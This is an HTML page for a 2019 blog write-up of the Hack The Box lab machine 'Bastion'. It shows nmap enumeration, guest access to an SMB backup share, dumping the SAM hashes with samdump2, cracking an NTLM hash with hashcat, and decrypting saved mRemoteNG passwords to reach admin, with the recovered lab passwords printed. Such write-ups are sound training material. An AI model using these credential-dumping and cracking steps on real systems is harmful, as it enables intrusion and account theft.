@@ -1,0 +1,374 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  
+    <title>Hack The Box: Bastion :: ikuamike — CTFs :: InfoSec :: Hacking</title>
+  
+  <meta http-equiv="content-type" content="text/html; charset=utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1">
+<meta name="description" content=""/>
+<meta name="keywords" content=", "/>
+<meta name="robots" content="noodp"/>
+<link rel="canonical" href="https://ikuamike.github.io/posts/2019/bastion-htb/" />
+
+
+<link rel="stylesheet" href="https://ikuamike.github.io/assets/style.css">
+
+  <link rel="stylesheet" href="https://ikuamike.github.io/assets/green.css">
+
+
+
+<link rel="stylesheet" href="https://ikuamike.github.io/style.css">
+
+
+<link rel="apple-touch-icon-precomposed" sizes="144x144" href="https://ikuamike.github.io/img/apple-touch-icon-144-precomposed.png">
+
+<link rel="shortcut icon" href="https://ikuamike.github.io/img/favicon/green.png">
+
+
+
+<meta name="twitter:card" content="summary" />
+<meta name="twitter:title" content="Hack The Box: Bastion :: ikuamike — CTFs :: InfoSec :: Hacking" />
+<meta name="twitter:description" content="" />
+<meta name="twitter:site" content="https://ikuamike.github.io/" />
+<meta name="twitter:creator" content="" />
+<meta name="twitter:image" content="">
+
+
+<meta property="og:locale" content="en" />
+<meta property="og:type" content="article" />
+<meta property="og:title" content="Hack The Box: Bastion :: ikuamike — CTFs :: InfoSec :: Hacking">
+<meta property="og:description" content="" />
+<meta property="og:url" content="https://ikuamike.github.io/posts/2019/bastion-htb/" />
+<meta property="og:site_name" content="Hack The Box: Bastion" />
+<meta property="og:image" content="">
+<meta property="og:image:width" content="2048">
+<meta property="og:image:height" content="1024">
+
+<meta property="article:published_time" content="2019-09-06 00:00:00 &#43;0000 UTC" />
+
+
+
+
+
+
+
+
+
+
+
+</head>
+<body class="">
+
+
+<div class="container center">
+
+  <header class="header">
+  <div class="header__inner">
+    <div class="header__logo">
+      <a href="/">
+  <div class="logo">
+    &gt; cd ~
+  </div>
+</a>
+
+    </div>
+    <div class="menu-trigger">menu</div>
+  </div>
+  
+    <nav class="menu">
+  <ul class="menu__inner menu__inner--desktop">
+    
+      
+        
+          <li><a href="/about">About Me</a></li>
+        
+      
+      
+    
+
+    
+  </ul>
+
+  <ul class="menu__inner menu__inner--mobile">
+    
+      
+        <li><a href="/about">About Me</a></li>
+      
+    
+    
+  </ul>
+</nav>
+
+  
+</header>
+
+
+  <div class="content">
+    
+<div class="post">
+  <h1 class="post-title">
+    <a href="https://ikuamike.github.io/posts/2019/bastion-htb/">Hack The Box: Bastion</a></h1>
+  <div class="post-meta">
+      
+    <span class="post-date">
+      2019-09-06
+    </span>
+    
+    
+  </div>
+
+  
+  <span class="post-tags">
+    
+    #<a href="https://ikuamike.github.io/tags/htb/">HTB</a>&nbsp;
+    
+  </span>
+  
+
+  
+
+  <div class="post-content">
+    <img src="/img/bastion/info_card.png"  alt="Bastion Info Card"  class="center"  style="border-radius: 8px;"  />
+
+
+
+<h1 id="summary">Summary</h1>
+
+<p>Bastion was a relatively easy box. There is an smb share is accessible without credentials and inside there is a backup drive that we can mount and access. From the drive we can dump the SAM file and crack it to get login credentials. Once logged in we find mRemoteNG installed and extract its saved passwords to get admin access.</p>
+
+<h1 id="enumeration">Enumeration</h1>
+
+<p>I start with this nmap command to quickly find open ports.</p>
+
+<pre><code>nmap -sS -p- --min-rate=1000 10.10.10.134
+</code></pre>
+
+<pre><code>Nmap scan report for 10.10.10.134
+Host is up (0.23s latency).
+Not shown: 65522 closed ports
+PORT      STATE SERVICE
+22/tcp    open  ssh
+135/tcp   open  msrpc
+139/tcp   open  netbios-ssn
+445/tcp   open  microsoft-ds
+5985/tcp  open  wsman
+47001/tcp open  winrm
+49664/tcp open  unknown
+49665/tcp open  unknown
+49666/tcp open  unknown
+49667/tcp open  unknown
+49668/tcp open  unknown
+49669/tcp open  unknown
+49670/tcp open  unknown
+</code></pre>
+
+<p>Then run a thorough service scan on the discovered ports.</p>
+
+<pre><code>nmap -sC -sV -p 22,135,139,445,5985,47001 -oA nmap/bastion 10.10.10.134
+</code></pre>
+
+<pre><code>Nmap scan report for 10.10.10.134
+Host is up (0.22s latency).
+
+PORT      STATE SERVICE      VERSION
+22/tcp    open  ssh          OpenSSH for_Windows_7.9 (protocol 2.0)
+| ssh-hostkey:
+|   2048 3a:56:ae:75:3c:78:0e:c8:56:4d:cb:1c:22:bf:45:8a (RSA)
+|   256 cc:2e:56:ab:19:97:d5:bb:03:fb:82:cd:63:da:68:01 (ECDSA)
+|_  256 93:5f:5d:aa:ca:9f:53:e7:f2:82:e6:64:a8:a3:a0:18 (ED25519)
+135/tcp   open  msrpc        Microsoft Windows RPC
+139/tcp   open  netbios-ssn  Microsoft Windows netbios-ssn
+445/tcp   open  microsoft-ds Windows Server 2016 Standard 14393 microsoft-ds
+5985/tcp  open  http         Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
+|_http-server-header: Microsoft-HTTPAPI/2.0
+|_http-title: Not Found
+47001/tcp open  http         Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
+|_http-server-header: Microsoft-HTTPAPI/2.0
+|_http-title: Not Found
+Service Info: OSs: Windows, Windows Server 2008 R2 - 2012; CPE: cpe:/o:microsoft:windows
+
+Host script results:
+|_clock-skew: mean: -42m39s, deviation: 1h09m15s, median: -2m40s
+| smb-os-discovery:
+|   OS: Windows Server 2016 Standard 14393 (Windows Server 2016 Standard 6.3)
+|   Computer name: Bastion
+|   NetBIOS computer name: BASTION\x00
+|   Workgroup: WORKGROUP\x00
+|_  System time: 2019-09-06T13:28:45+02:00
+| smb-security-mode:
+|   account_used: guest
+|   authentication_level: user
+|   challenge_response: supported
+|_  message_signing: disabled (dangerous, but default)
+| smb2-security-mode:
+|   2.02:
+|_    Message signing enabled but not required
+| smb2-time:
+|   date: 2019-09-06 12:28:49
+|_  start_date: 2019-09-06 11:58:13
+
+</code></pre>
+
+<h2 id="smb">SMB</h2>
+
+<p>Based on the open ports the best service to check out first is smb.</p>
+
+<pre><code>smbmap -H 10.10.10.134 -u ' '
+</code></pre>
+
+<pre><code>[+] Finding open SMB ports....
+[+] Guest SMB session established on 10.10.10.134...
+[+] IP: 10.10.10.134:445        Name: 10.10.10.134
+        Disk                                                    Permissions
+        ----                                                    -----------
+        ADMIN$                                                  NO ACCESS
+        Backups                                                 READ, WRITE
+        C$                                                      NO ACCESS
+        IPC$                                                    READ ONLY
+</code></pre>
+
+<p>After running smbmap, I discover a share called Backups that I have read and write permissions as a guest user.</p>
+
+<p>Since this is a windows machine I will switch to my windows vm to make my work easier.</p>
+
+
+  <img src="/img/bastion/backup_share.png"  alt="backup share"  class="center"  style="border-radius: 8px;"  />
+
+
+
+<p><br></p>
+
+<p>Contents of note.txt</p>
+
+<p><em>Sysadmins: please don&rsquo;t transfer the entire backup file locally, the VPN to the subsidiary office is too slow.</em></p>
+
+<p>Going deeper into the WindowsImageBackup folder I found a backup image which is quite big. Downloading the whole file would not be an option as the note.txt suggested. Fortunately I can mount it through the share remotely, this is the reason why I wanted to use a windows vm.</p>
+
+
+  <img src="/img/bastion/backup_share_2.png"  alt="backup share"  class="center"  style="border-radius: 8px;"  />
+
+
+
+<p><br></p>
+
+<p>On mounting it, it appears as Local Disk (D:). After accessing the home directory of user L4mpje and looking through the folders there was no user.txt, it must have been excluded from the backup.</p>
+
+
+  <img src="/img/bastion/backup_share_3.png"  alt="backup share"  class="center"  style="border-radius: 8px;"  />
+
+
+
+<p>At this stage I was stuck for a while (I still suck at owning windows) and after some hints in the forum I figured I should look at where credentials are stored locally on windows and how to get them. Simply the equivalent of /etc/shadow or /etc/passwd on linux.</p>
+
+<p>I learnt that I should be looking in C:\windows\system32\config for the SAM and SYSTEM files which I found.</p>
+
+
+  <img src="/img/bastion/backup_share_4.png"  alt="backup share"  class="center"  style="border-radius: 8px;"  />
+
+
+
+<h5 id="now-to-get-the-credentials">Now to get the credentials!</h5>
+
+<p>I pulled the 2 files back to my kali box and using samdump2 I got the user hash.</p>
+
+<pre><code>samdump2 SYSTEM SAM
+
+*disabled* Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+*disabled* Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+L4mpje:1000:aad3b435b51404eeaad3b435b51404ee:26112010952d963c8dc4217daec986d9:::
+</code></pre>
+
+<p>I then cracked the NTLM hash for L4mpje using hashcat and got the password.</p>
+
+<pre><code>hashcat -m 1000 -a 0 26112010952d963c8dc4217daec986d9 /usr/share/wordlists/rockyou.txt --force
+
+26112010952d963c8dc4217daec986d9:bureaulampje
+</code></pre>
+
+<h1 id="exploitation">Exploitation</h1>
+
+<p>Now that I have a username and password I can login through ssh.</p>
+
+
+  <img src="/img/bastion/bastion_5.png"  alt="backup share"  class="center"  style="border-radius: 8px;"  />
+
+
+
+<p>Now that user is owned, let&rsquo;s try to escalate privileges to admin.</p>
+
+<p>I switched to powershell and started looking at installed programs. mRemoteNG isn&rsquo;t a default windows application so let me look into it and if it can help in privesc.</p>
+
+
+  <img src="/img/bastion/bastion_6.png"  alt="backup share"  class="center"  style="border-radius: 8px;"  />
+
+
+
+<p><br></p>
+
+<p>According to their website:</p>
+
+<p><em>mRemoteNG is a fork of mRemote: an open source, tabbed, multi-protocol, remote connections manager.</em></p>
+
+<p>I found a metasploit module that claims to extract saved passwords from mRemoteNG. Since I am logged in I don&rsquo;t need metasploit so I looked at the source to see how it extracts the passwords and decrypts them.</p>
+
+<p>The saved passwords are located in AppData in mRemoteNG\confCons.xml. Once I found the file the admin password was there but encrypted.</p>
+
+
+  <img src="/img/bastion/bastion_7.png"  alt="backup share"  class="center"  style="border-radius: 8px;"  />
+
+
+
+<p>I was able to find a script on github to decrypt the password.</p>
+
+<pre><code>./mremoteng_decrypt.py -s aEWNFV5uGcjUHF0uS17QTdT9kVqtKCPeoC0Nw5dmaPFjNQ2kt/zO5xDqE4HdVmHAowVRdC7emf7lWWA10dQKiw==
+
+Password: thXLHM96BeKL0ER2
+</code></pre>
+
+<p>I can finally login as administrator and own system!</p>
+
+
+  <img src="/img/bastion/bastion_8.png"  alt="backup share"  class="center"  style="border-radius: 8px;"  />
+
+
+
+<h1 id="references">References</h1>
+
+<ul>
+<li><a href="https://github.com/haseebT/mRemoteNG-Decrypt/blob/master/mremoteng_decrypt.py">mremoteng_decrypt.py</a></li>
+<li><a href="https://vulners.com/metasploit/MSF:POST/WINDOWS/GATHER/CREDENTIALS/MREMOTE/">mremote metasploit module</a></li>
+</ul>
+  </div>
+  
+
+  
+
+</div>
+
+  </div>
+
+  
+    <footer class="footer">
+  <div class="footer__inner">
+    
+      <div class="copyright copyright--user">
+        <span>© Michael Ikua</span>
+    
+        <span>:: Theme made by <a href="https://twitter.com/panr">panr</a></span>
+      </div>
+  </div>
+</footer>
+
+<script src="https://ikuamike.github.io/assets/main.js"></script>
+<script src="https://ikuamike.github.io/assets/prism.js"></script>
+
+
+
+
+
+  
+</div>
+
+</body>
+</html>
